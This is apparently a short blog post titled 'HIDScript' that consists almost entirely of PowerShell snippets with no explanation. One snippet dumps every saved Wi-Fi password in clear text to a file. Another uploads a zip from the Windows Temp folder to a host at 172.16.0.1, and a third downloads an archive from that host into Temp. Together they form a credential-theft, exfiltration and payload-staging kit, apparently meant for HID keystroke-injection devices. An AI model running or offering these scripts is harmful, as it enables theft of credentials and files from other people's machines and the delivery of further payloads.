---
layout: post
title: "HIDScript"
date: 2021-04-01 16:41:26 +0800
comments: true
categories: powershell
---
``` powershell

## getWiFiPassWd

$ws=(netsh wlan show profiles) -match " : ";foreach($s in $ws){$ssid=$s.Split(":")[1].Trim();$pw=(netsh wlan show profiles name=$ssid key=clear);
$c=0;foreach($p in $pw){;if($c -eq "32"){$pass=$p.Split(":")[1].Trim();}$c+=1}echo "$ssid $pass" >> passwd.txt}
type passwd.txt



## uploadFiles

$FilePath="C:/Windows/Temp/files.zip"
$Url="http://172.16.0.1/"
$fileName=[System.IO.Path]::GetFileName($filePath)
$fileBytes=([System.IO.File]::ReadAllBytes($FilePath))
$fileEnc=[System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileBytes)
$boundary=[System.Guid]::NewGuid().ToString()
$lf="`r`n"
$bodyLines=("--$boundary","Content-Disposition: form-data; name=`"uploads`"; filename=`"$FileName`"","Content-Type: application/octet-stream$lf",$fileEnc,"--$boundary--$lf") -join $lf
Invoke-RestMethod -Uri $Url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines



## downloadFiles

$Source="http://172.16.0.1/uploads/dFiles.7z"
$Destination="C:/Windows/Temp/dFiles.7z"
Invoke-WebRequest -Uri $Source -OutFile $Destination




```